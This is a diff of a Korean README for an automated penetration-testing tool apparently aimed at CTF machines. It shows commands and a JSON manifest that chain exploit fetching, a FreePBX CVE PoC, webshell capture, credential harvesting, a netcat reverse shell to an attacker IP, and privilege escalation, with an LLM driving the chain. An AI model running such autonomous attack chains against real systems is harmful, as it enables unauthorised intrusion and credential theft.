@@ -530,9 +530,11 @@ assassin 10.129.1.5 --full-auto --llm claude --html --json
 
 핑거프린트된 제품/버전이 모듈과 매칭되면 `--full-auto`(또는 `--exploit-exec --auto-poc`)가 다음을 잇는다:
 
-1. **PoC 조달(게이트-세이프)** — 로컬 선조달분 또는 `searchsploit -m`(로컬 무해). exploit-db 에 없는
-   CVE 는 자동으로 외부 clone 하지 않고 **1회 수동 조달 안내**(git)만 남긴다(스코프 게이트 보존).
-   받아 둔 디렉터리는 `--poc-dir` 로 지정하거나 `~/.assassin/pocs/<CVE>/`·현재 디렉터리에 둔다.
+1. **PoC 자동 조달(옵트인, `--full-auto` 가 자동 켬)** — 로컬 선조달분 → `searchsploit -m`(로컬
+   무해) → 없으면 **레지스트리가 선언한 공개 출처에서 자동 조달**(`git clone --depth 1`). 받는
+   출처는 레지스트리/매니페스트 값만 쓴다(임의/LLM/타겟 URL 금지 — 주입 방지). 받기만 하고 실행은
+   아래 3관문. `~/.assassin/pocs/<CVE>/`(또는 `--poc-dir`)에 캐시된다. `--fetch-pocs` 를 빼면
+   조달하지 않고 1회 수동 안내만 남긴다. `ASSASSIN_NO_NET=1` 이면 실 조달을 막는다(오프라인 안전).
 2. **PoC 실행 → 웹셸 URL 캡처** — PoC 출력에서 드롭된 웹셸 URL(`?cmd=`)을 잡아 웹 RCE 발판으로 잇는다.
 3. **user 플래그** — 발판이 서면 설정/DB 자격 수확 + `user.txt` 읽기가 자동으로 따라온다.
 4. **nc 리버스셸 수신(`--catch-revshell`)** — 리스너를 백그라운드로 띄우고 웹셸로 리버스셸 payload 를
@@ -542,18 +544,40 @@ assassin 10.129.1.5 --full-auto --llm claude --html --json
 
 | 항목 | 내용 |
 |---|---|
-| 켜는 법 | `assassin <t> --full-auto --attacker-ip <tun0 IP> --llm claude` (리버스셸 수신까지 자동) |
-| PoC 선조달 | `assassin <t> --full-auto --poc-dir ~/pocs` — 미등재 CVE PoC 를 1회 받아 두면 이후 자동 사용 |
-| 수록 CVE | `CVE-2025-57819`(FreePBX < 16.0.89 pre-auth RCE) 외 추가 예정 |
+| 켜는 법 | `assassin <t> --full-auto --attacker-ip <tun0 IP> --llm claude` (PoC 조달·리버스셸 수신까지 자동) |
+| PoC 캐시/오프라인 | `--poc-dir ~/pocs` 로 위치 지정. 미리 받아 두면 네트워크 없이 사용. `--fetch-pocs` 빼면 자동 조달 끔 |
+| 다른 CVE 추가 | `--exploit-modules mods.json` — 코드 수정 없이 CVE 모듈을 데이터로 추가(아래 매니페스트) |
+| 수록 CVE | `CVE-2025-57819`(FreePBX < 16.0.89) 내장. 그 외는 매니페스트/`--auto-poc`(exploit-db) 로 커버 |
 | 안전 | 전부 옵트인·스코프 게이트·3관문 하. 무기 코드 비탑재(공개 PoC 런타임 조달). 인가/CTF 대상 전용 |
 
 ```bash
-# connected.htb(FreePBX) 류: 핑거프린트→CVE-2025-57819 PoC→웹셸→nc 수신→user→privesc 자동
-assassin 10.129.1.5 --full-auto --attacker-ip 10.10.14.13 --poc-dir ~/pocs --llm claude --html
+# connected.htb(FreePBX) 류: 핑거프린트→PoC 자동조달→CVE-2025-57819→웹셸→nc 수신→user→privesc 자동
+assassin 10.129.1.5 --full-auto --attacker-ip 10.10.14.13 --llm claude --html
 ```
 
+**다른 CVE/머신에 적용 — 익스 모듈 매니페스트(`--exploit-modules`)**: 아래처럼 JSON 으로 모듈을
+추가하면 핑거프린트 매칭 시 같은 체인(조달→웹셸 캡처→플래그→privesc)이 돈다. `git_source`/`edb_id`
+는 **운영자가 직접 넣는 신뢰 출처**다(LLM·타겟 유래 아님).
+
+```json
+{ "modules": [ {
+  "cve": "CVE-XXXX-YYYY", "product": "someapp", "vuln_below": "3.2.0",
+  "channel": "web", "git_source": "https://github.com/<owner>/<poc-repo>",
+  "poc_globs": ["*someapp*.py"], "invocation": "python3 {poc} -u {scheme}://{target}/",
+  "foothold_regex": "(https?://\\S+\\.php)", "cmd_param": "cmd", "cmd_method": "GET", "cmd_inject": "query"
+} ] }
+```
+```bash
+assassin 10.129.1.7 --full-auto --attacker-ip 10.10.14.13 --exploit-modules ~/mods.json --llm claude
+```
+
+> **exploit-db 에 있는 CVE 는 매니페스트 없이도** `--auto-poc`(= `--full-auto` 포함)가 `searchsploit`
+> 버전매칭으로 자동 선택·발사한다. 매니페스트는 미등재/최신 CVE 보강용이다.
+>
 > 자동 root 는 **표준 상승 경로(sudo/SUID/capability GTFOBins)**가 있을 때만 성립한다. 비표준 체인
 > (DB UDF·특정 커널 LPE 등)은 설계상 자동 발사하지 않고 열거·제안으로 남긴다(정직성 §3, 안전 §4).
+> 받은 공개 PoC 는 제3자 코드다 — 출처 신뢰는 운영자 책임이며, 민감 환경에선 `--poc-dir` 로 미리
+> 검토한 PoC 만 쓰는 것을 권장한다.
 
 ---
 
